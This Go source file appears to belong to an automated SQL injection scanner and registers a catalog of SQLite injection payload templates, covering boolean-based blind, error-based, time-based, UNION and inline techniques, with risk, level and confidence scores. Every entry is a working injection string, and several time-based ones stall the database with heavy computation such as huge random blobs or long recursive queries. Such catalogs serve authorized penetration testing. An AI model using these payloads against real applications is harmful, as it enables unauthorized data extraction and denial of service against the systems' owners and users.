package payloads

// SQLite payload catalog. SQLite has no native SLEEP; time is approximated
// with heavy computation.

func sqRow(id, title, tech, clause, minv, maxv string, risk, level, conf int, pre, suf, tpl string) Payload {
	return Payload{
		ID: id, Title: title, DBMS: DBSQLite, Technique: Technique(tech),
		Clause: Clause(clause), MinVersion: minv, MaxVersion: maxv,
		Risk: risk, Level: level, Confidence: conf,
		PrefixMode: pre, SuffixMode: suf, Template: tpl,
	}
}

func init() {
	rows := []Payload{
		// ---- Boolean ----
		sqRow("sqlite-bool-and-num", "SQLite AND boolean-based blind - WHERE clause (numeric)", "boolean", "where", "", "", 1, 1, 90, "and", "comment", "{orig} AND 1=1"),
		sqRow("sqlite-bool-and-string", "SQLite AND boolean-based blind - WHERE clause (string)", "boolean", "where", "", "", 1, 1, 90, "and", "comment", "{orig}' AND '1'='1"),
		sqRow("sqlite-bool-and-alpha", "SQLite AND boolean-based blind - WHERE clause (alphabetic)", "boolean", "where", "", "", 1, 1, 88, "and", "comment", "{orig}' AND 'a'='a"),
		sqRow("sqlite-bool-or-num", "SQLite OR boolean-based blind - WHERE clause (numeric)", "boolean", "where", "", "", 1, 2, 88, "or", "comment", "{orig} OR 1=1"),
		sqRow("sqlite-bool-version", "SQLite AND boolean-based blind - WHERE clause (sqlite_version)", "boolean", "where", "", "", 1, 2, 86, "and", "comment", "{orig} AND sqlite_version()=sqlite_version()"),
		sqRow("sqlite-bool-sub-version", "SQLite AND boolean-based blind - WHERE clause (subquery sqlite_version)", "boolean", "where", "", "", 1, 2, 84, "and", "comment", "{orig} AND (SELECT sqlite_version())=(SELECT sqlite_version())"),
		sqRow("sqlite-bool-hex", "SQLite AND boolean-based blind - WHERE clause (HEX)", "boolean", "where", "", "", 1, 2, 84, "and", "comment", "{orig} AND hex('a')='61'"),
		sqRow("sqlite-bool-like", "SQLite AND boolean-based blind - WHERE clause (LIKE)", "boolean", "where", "", "", 1, 2, 86, "and", "comment", "{orig}' AND 'a' LIKE 'a'"),
		sqRow("sqlite-bool-glob", "SQLite AND boolean-based blind - WHERE clause (GLOB)", "boolean", "where", "", "", 1, 3, 82, "and", "comment", "{orig}' AND 'a' GLOB 'a'"),
		sqRow("sqlite-bool-having", "SQLite AND boolean-based blind - HAVING clause", "boolean", "having", "", "", 1, 3, 84, "and", "comment", "{orig} HAVING 1=1"),
		sqRow("sqlite-bool-gb", "SQLite AND boolean-based blind - GROUP BY clause", "boolean", "groupby", "", "", 1, 3, 82, "and", "comment", "{orig} GROUP BY 1 HAVING 1=1"),
		sqRow("sqlite-bool-ob", "SQLite AND boolean-based blind - ORDER BY clause", "boolean", "orderby", "", "", 1, 2, 84, "and", "comment", "{orig} ORDER BY (SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END)"),

		// ---- Error-based / info ----
		sqRow("sqlite-err-randomblob", "SQLite AND error-based - WHERE clause (randomblob negative)", "error", "where", "", "", 1, 2, 86, "and", "comment", "{orig}' AND (SELECT randomblob(-100000000))"),
		sqRow("sqlite-err-abs", "SQLite AND error-based - WHERE clause (ABS overflow)", "error", "where", "", "", 1, 2, 86, "and", "comment", "{orig}' AND (SELECT abs(-9223372036854775808))"),
		sqRow("sqlite-err-version-cast", "SQLite AND error-based - WHERE clause (sqlite_version cast)", "error", "where", "", "", 1, 3, 82, "and", "comment", "{orig} AND 1=CAST(sqlite_version() AS INTEGER)"),
		sqRow("sqlite-err-zeroblob", "SQLite AND error-based - WHERE clause (zeroblob)", "error", "where", "", "", 1, 3, 82, "and", "comment", "{orig}' AND (SELECT zeroblob(-1))"),
		sqRow("sqlite-err-no-column", "SQLite AND error-based - WHERE clause (no such column)", "error", "where", "", "", 1, 2, 84, "and", "comment", "{orig}' AND (SELECT {query})"),

		// ---- Time-based (heavy computation) ----
		sqRow("sqlite-time-recursive", "SQLite AND time-based blind - WHERE clause (recursive CTE)", "time", "where", "3.8.3", "", 3, 3, 84, "and", "comment", "{orig} AND (SELECT count(*) FROM (WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<{seconds}0000000) SELECT x FROM c))=0"),
		sqRow("sqlite-time-randomblob", "SQLite AND time-based blind - WHERE clause (RANDOMBLOB LIKE)", "time", "where", "", "", 2, 3, 82, "and", "comment", "{orig} AND (SELECT CASE WHEN (1=1) THEN LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) ELSE 1 END)"),
		sqRow("sqlite-time-heavy", "SQLite AND time-based blind - WHERE clause (heavy cross join)", "time", "where", "", "", 2, 4, 82, "and", "comment", "{orig} AND (SELECT count(*) FROM (SELECT 1 UNION ALL SELECT 2) a, (SELECT 1 UNION ALL SELECT 2) b, (SELECT 1 UNION ALL SELECT 2) c)"),

		// ---- UNION ----
		sqRow("sqlite-union-orderby", "SQLite UNION query - ORDER BY column probe", "union", "where", "", "", 1, 1, 88, "replace", "comment", "{orig} ORDER BY {marker}"),
		sqRow("sqlite-union-select-null", "SQLite UNION query - UNION SELECT NULL", "union", "where", "", "", 1, 1, 90, "replace", "comment", "{orig} UNION SELECT {colcount}"),
		sqRow("sqlite-union-all-null", "SQLite UNION query - UNION ALL SELECT NULL", "union", "where", "", "", 1, 1, 90, "replace", "comment", "{orig} UNION ALL SELECT {colcount}"),
		sqRow("sqlite-union-select-marker", "SQLite UNION query - UNION SELECT marker", "union", "where", "", "", 1, 2, 92, "replace", "comment", "{orig} UNION SELECT {marker},{colcount}"),

		// ---- Inline ----
		sqRow("sqlite-inline-sub", "SQLite inline query - subquery as value", "inline", "where", "", "", 1, 1, 86, "value", "none", "(SELECT 1)"),
		sqRow("sqlite-inline-nested", "SQLite inline query - nested subquery comparison", "inline", "where", "", "", 1, 2, 84, "and", "comment", "{orig} AND (SELECT 8634)=8634"),
	}
	for _, p := range rows {
		MustRegister(p)
	}
}
